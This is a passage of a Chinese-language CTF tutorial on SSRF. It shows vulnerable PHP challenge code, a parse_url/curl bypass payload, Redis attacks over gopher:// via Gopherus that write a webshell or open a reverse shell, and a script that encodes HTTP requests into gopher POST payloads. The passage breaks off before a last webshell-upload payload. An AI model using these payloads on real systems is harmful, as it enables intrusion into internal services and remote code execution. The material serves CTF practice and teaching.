class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;check_inner_ip&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$url&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$url&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27; is inner ip&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$ch&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;curl_init&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_ invoke__&#34;&gt;curl_setopt&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$ch&lt;/span&gt;, CURLOPT_URL, &lt;span class=&#34;variable&#34;&gt;$url&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_ invoke__&#34;&gt;curl_setopt&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$ch&lt;/span&gt;, CURLOPT_RETURNTRANSFER, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_ invoke__&#34;&gt;curl_setopt&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$ch&lt;/span&gt;, CURLOPT_HEADER, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$output&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;curl_exec&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$ch&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$result_info&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;curl_getinfo&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$ch&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;variable&#34;&gt;$result_info&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;redirect_url&amp;#x27;&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;title function_ invoke__&#34;&gt;safe_request_url&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$result_info&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;redirect_url&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_ invoke__&#34;&gt;curl_close&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$ch&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$output&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$url&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;url&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;keyword&#34;&gt;empty&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$url&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;safe_request_url&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$url&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;可以看到 check_inner_ip 通过 url_parse 检测是否为内网 ip，如果满足不是内网 ip ，通过 curl 请求 url 返回结果，这题就可以利用 curl 和 parse_url 解析的差异不同来绕过，让 parse_url 处理外部网站，最后 curl 请求内网网址。&lt;/p&gt;
&lt;p&gt;最后的 payload 为&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://ip/challenge.php?url=http://@127.0.0.1:80%20@www.baidu.com/flag.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;有关 URL 的解析问题更加详细可参考：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/qq_38154820/article/details/109252839&#34;&gt;https://blog.csdn.net/qq_38154820/article/details/109252839 &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf&#34;&gt;https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;gopher攻击redis&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gopher攻击redis&#34;&gt;#&lt;/a&gt; Gopher 攻击 Redis&lt;/h3&gt;
&lt;h4 id=&#34;redis的协议数据流格式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#redis的协议数据流格式&#34;&gt;#&lt;/a&gt; redis 的协议数据流格式&lt;/h4&gt;
&lt;p&gt;数据流格式中 CR LF 表示的就是 \r \n&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;*&amp;lt;参数数量&amp;gt; CR LF&lt;br&gt;
&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mtext&gt;参数&lt;/mtext&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mtext&gt;的字节数量&lt;/mtext&gt;&lt;mo&gt;&amp;gt;&lt;/mo&gt;&lt;mi&gt;C&lt;/mi&gt;&lt;mi&gt;R&lt;/mi&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;mi&gt;F&lt;/mi&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mtext&gt;参数&lt;/mtext&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mtext&gt;的数据&lt;/mtext&gt;&lt;mo&gt;&amp;gt;&lt;/mo&gt;&lt;mi&gt;C&lt;/mi&gt;&lt;mi&gt;R&lt;/mi&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;mi&gt;F&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;&amp;lt;参数 1 的字节数量&amp;gt; CR LF
&amp;lt;参数 1 的数据&amp;gt; CR LF
...
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.5782em;vertical-align:-0.0391em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.72243em;vertical-align:-0.0391em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;参&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;数&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;的&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;字&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;节&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;数&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;量&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.72243em;vertical-align:-0.0391em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.07153em;&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.00773em;&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;F&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.72243em;vertical-align:-0.0391em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;参&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;数&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;的&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;数&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;据&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.07153em;&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.00773em;&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;F&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&amp;lt;参数 N 的字节数量&amp;gt; CR LF&lt;br&gt;
 &amp;lt;参数 N 的数据&amp;gt; CR LF&lt;br&gt;
 简单示例：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;*4：表示 4 个参数 config、set、dir、/var/www/html&lt;br&gt;
$6：表示每个参数的字节长度 config 长度为 6&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;*4&lt;br&gt;
$6&lt;br&gt;
config&lt;br&gt;
$3&lt;br&gt;
set&lt;br&gt;
$3&lt;br&gt;
dir&lt;br&gt;
$13&lt;br&gt;
/var/www/html&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Redis 一般都是绑定在 6379 端口，如果没有设置口令（默认是无），攻击者就可以通过 SSRF 漏洞未授权访问内网 Redis，一般用来写入 Crontab 定时任务用来反弹 shell，或者写入 webshell 等等。&lt;/p&gt;
&lt;p&gt;在 CTF 题目中如果找到了内网的服务开了 6379 端口，一般来说就是 Redis 未授权访问漏洞，并且没有 ban 掉 gopher://，可以用网上的脚本一把梭，比如：Gopherus&lt;/p&gt;
&lt;h4 id=&#34;写入shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#写入shell&#34;&gt;#&lt;/a&gt; 写入 shell&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;python2 gopherus.py --exploit redis&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/23/N2EnplomH1vFh8I.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;在有 SSRF 漏洞的地方输入生成的 payload— 即 gopher://127.0.0.1:6379 后面一大段，接下来会在目录下生成 shell.php。&lt;/p&gt;
&lt;p&gt;要注意的是如果是在 html 的输入框中直接输入提交就行，但要在浏览器的 URL 输入的话，一定要记得 URL 编码一次。&lt;/p&gt;
&lt;h4 id=&#34;反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反弹shell&#34;&gt;#&lt;/a&gt; 反弹 shell&lt;/h4&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/23/wsnqCkpzOIoucZr.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;要配合 nc 监听&lt;/p&gt;
&lt;h3 id=&#34;攻击mysql&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#攻击mysql&#34;&gt;#&lt;/a&gt; 攻击 Mysql&lt;/h3&gt;
&lt;p&gt;攻击内网 mysql 的条件：内网开启了 3306 端口，mysql 无密码&lt;/p&gt;
&lt;p&gt;上面的题目复现就用到了这个&lt;/p&gt;
&lt;h3 id=&#34;gopher发送请求&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gopher发送请求&#34;&gt;#&lt;/a&gt; Gopher 发送请求&lt;/h3&gt;
&lt;p&gt;SSRF 漏洞是服务端请求伪造攻击，不论是 GET 或者是 POST 方法，都是为了达到一个目的，就是让服务端帮我们来执行请求。&lt;/p&gt;
&lt;p&gt;那么在 CTF 中什么情况需要利用到这种方法呢，比如发现了一个内网的应用有上传的功能，我们需要通过 POST 提交数据，而且 Gopher 协议没有被 ban，我们就可以考虑构造一个请求去打内网，下面先从本地看看如何构造：&lt;/p&gt;
&lt;p&gt;通常，我们可以利用 gopher:// 协议可以用来发送 Get 和 Post 请求，需要注意的点是要对发送的请求头中的空格和一些特殊字符进行 url 编码，如果是在 URL 中提交 payload 的时侯要再进行一次 url 编码，先来看看如何发送简单的请求。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;POST 请求&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在 phpstudy 写入 1.php&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Hello&amp;quot;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;burpsuite 抓包获取请求头，POST 包的请求头有很多行，我们用的时候不用全部带上，但是要记得加上 Content-Type 和 Content-Length，也可以全部带上&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;POST /1.php HTTP/1.1&lt;br&gt;
Host: 192.168.0.102&lt;br&gt;
Content-Type: application/x-www-form-urlencoded&lt;br&gt;
Content-Length: 7&lt;/p&gt;
&lt;p&gt;a=world&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;然后需要对空格和一些特殊字符进行 url 编码，注意把其中的换行的地方加上 %0D%0A，当然手动加肯定是太麻烦了，这里给出一个脚本。&lt;/p&gt;
&lt;p&gt;一键编码脚本：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; urllib&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;test =\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;POST /1.php HTTP/1.1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Host: 192.168.0.102&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Content-Length: 7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;a=world&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tmp = urllib.parse.quote(test)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;new = tmp.replace(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%0A&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;%0D%0A&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;result = &lt;span class=&#34;string&#34;&gt;&amp;#x27;_&amp;#x27;&lt;/span&gt;+new&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(result)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;在里面加上你的请求体运行，然后我们在输出结果前面手动加上 gopher 协议头和 IP: 端口，最终为：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;gopher://192.168.0.102:80/_POST%20/1.php%20HTTP/1.1%0D%0AHost%3A%20192.168.0.102%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%207%0D%0A%0D%0Aa%3Dworld%0D%0A&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后用 curl 命令发出我们的请求，可以看到成功获取响应包了。&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/23/lV8z5cASXZLnbNh.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;需要注意的是，如果要在 url 传入的话需要将发送的 POST 后面一大串再 url 编码一次&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;GET 请求：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;GET 请求发送和 POST 请求基本一样&lt;/p&gt;
&lt;p&gt;相关例题：2020 强网杯 half_infiltration&lt;/p&gt;
&lt;p&gt;通过前面一系列操作获得 ssrf.php&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//经过扫描确认35000以下端口以及50000以上端口不存在任何内网服务,请继续渗透内网&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$url&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;we_have_done_ssrf_here_could_you_help_to_continue_it&amp;#x27;&lt;/span&gt;] ?? &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;/flag|var|apache|conf|proc|log/i&amp;quot;&lt;/span&gt; ,&lt;span class=&#34;variable&#34;&gt;$url&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$url&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$ch&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;curl_init&lt;/span&gt;(); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;title function_ invoke__&#34;&gt;curl_setopt&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$ch&lt;/span&gt;, CURLOPT_URL, &lt;span class=&#34;variable&#34;&gt;$url&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;title function_ invoke__&#34;&gt;curl_setopt&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$ch&lt;/span&gt;, CURLOPT_HEADER, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;title function_ invoke__&#34;&gt;curl_exec&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$ch&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;title function_ invoke__&#34;&gt;curl_close&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$ch&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;跑端口 40000 跑出来个登录框，然后有上传功能，参数 file 和 content 是上传文件&lt;/p&gt;
&lt;p&gt;于是用 gopher 协议发送一个 POST 请求写马，payload 如下：&lt;/p&gt;
